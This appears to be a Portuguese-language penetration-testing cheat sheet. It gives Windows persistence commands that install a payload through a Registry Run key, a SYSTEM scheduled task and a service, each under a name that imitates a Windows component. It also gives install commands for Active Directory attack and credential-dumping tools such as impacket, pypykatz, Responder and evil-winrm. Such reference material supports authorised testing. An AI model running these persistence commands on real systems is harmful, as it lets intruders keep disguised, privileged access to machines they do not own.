### Persistencia Rapida Windows

```cmd
:: Registry Run (nao requer admin)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

:: Tarefa agendada (requer admin para SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM /f

:: Servico Windows
sc create "WindowsSvc" binpath= "C:\Windows\Temp\payload.exe" start= auto && sc start "WindowsSvc"
```

---

## Comandos de Instalação / Setup Rápido

```bash
# Instalar impacket (Kali — geralmente já instalado):
pip3 install impacket
# ou:
git clone https://github.com/fortra/impacket && cd impacket && pip3 install .

# Instalar pypykatz:
pip3 install pypykatz

# Instalar certipy:
pip3 install certipy-ad

# Instalar NetExec:
pip3 install netexec

# Instalar CrackMapExec:
pip3 install crackmapexec

# Instalar evil-winrm:
gem install evil-winrm

# Instalar kerbrute:
go install github.com/ropnop/kerbrute@latest
# ou download binário de releases

# Instalar chisel:
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64

# Instalar ligolo-ng:
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy-linux-amd64 -O ligolo-proxy
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent-linux-amd64 -O ligolo-agent
chmod +x ligolo-proxy ligolo-agent

# BloodHound CE via Docker:
git clone https://github.com/SpecterOps/BloodHound && cd BloodHound
docker-compose up -d
# Acessar: http://localhost:8080

# Responder:
git clone https://github.com/lgandx/Responder
# ou: apt install responder
```
